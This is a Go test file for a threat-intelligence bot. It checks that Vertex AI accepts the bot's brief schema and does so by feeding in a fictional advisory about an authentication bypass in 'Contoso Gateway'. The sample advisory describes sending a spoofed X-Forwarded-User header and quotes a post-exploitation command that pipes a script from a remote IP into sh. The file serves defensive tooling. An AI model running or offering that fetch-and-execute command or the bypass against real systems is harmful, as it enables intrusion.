package tests

import (
	"context"
	"os"
	"testing"
	"time"

	"github.com/craftedsignal/threat-bot/internal/llm"
	"github.com/craftedsignal/threat-bot/internal/pipeline"
	"github.com/craftedsignal/threat-bot/internal/scraper"
)

// TestLiveBriefSchemaAccepted sends one real brief-assembly request to Vertex AI
// to prove the provider accepts the response schema (no 400 about depth, enum
// size or unsupported keywords) and that the schema-constrained answer decodes
// and survives validation. It spends one model call and needs Application
// Default Credentials, so it is skipped unless asked for:
//
//	THREAT_BOT_VERTEX_PROJECT=your-project THREAT_BOT_VERTEX_LOCATION=eu \
//	THREAT_BOT_VERTEX_MODEL=gemini-3.1-flash-lite go test ./tests/ -run LiveBriefSchema -v
func TestLiveBriefSchemaAccepted(t *testing.T) {
	project, location, model := os.Getenv("THREAT_BOT_VERTEX_PROJECT"), os.Getenv("THREAT_BOT_VERTEX_LOCATION"), os.Getenv("THREAT_BOT_VERTEX_MODEL")
	if project == "" || location == "" || model == "" {
		t.Skip("set THREAT_BOT_VERTEX_PROJECT, THREAT_BOT_VERTEX_LOCATION and THREAT_BOT_VERTEX_MODEL to run")
	}
	client, err := llm.NewVertexAIClient(project, location, model)
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	item := scraper.RawItem{
		SourceID: "live:1", Source: "rss", URL: "https://example.com/advisory", Title: "Contoso Gateway authentication bypass exploited in the wild",
		PublishedAt: time.Now().UTC(),
		Content: `Contoso disclosed CVE-2026-9999, an authentication bypass in Contoso Gateway 4.2 through 4.7.1 on Linux.
Attackers send a crafted POST to /api/v1/session/refresh with an X-Forwarded-User header and receive an admin session.
Contoso has seen exploitation since October 2026 and fixed the flaw in 4.7.2. Observed post-exploitation runs
"curl -s http://203.0.113.7/a.sh | sh" from the gateway process. Customers should upgrade to 4.7.2.`,
	}
	extraction := &pipeline.ExtractionResult{CVEs: []string{"CVE-2026-9999"}, AffectedVendors: []string{"Contoso"}, AffectedProducts: []string{"Contoso Gateway"}}
	got, err := pipeline.NewBriefAssembler(client).Assemble(ctx, item, extraction, nil)
	if err != nil {
		t.Fatalf("assembly against the live schema failed: %v", err)
	}
	if _, _, err := pipeline.NewBriefValidator().Validate(got); err != nil {
		t.Fatalf("live brief failed validation: %v\n%s", err, got)
	}
	t.Logf("live brief:\n%s", got)
}
